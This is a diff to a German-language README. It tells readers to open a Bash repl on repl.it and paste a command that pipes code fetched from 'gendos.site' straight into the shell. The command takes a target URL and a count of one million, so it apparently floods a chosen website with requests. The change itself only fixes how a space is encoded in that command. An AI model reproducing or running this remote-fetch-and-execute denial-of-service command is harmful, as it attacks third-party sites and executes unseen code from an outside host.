@@ -9,7 +9,7 @@ Geh auf [repl.it](https://repl.it) und generiere eine neue Bash repl.
 Dann paste dort folgenden code rein:
 
 ```bash
-curl -L "gendos.site?args=https://deinezielurl.de&20-n=1000000" | sh
+curl -L "gendos.site?args=https://deinezielurl.de%20-n=1000000" | sh
 ```
 
 Drücke auf `Run` und schau was passiert :D!
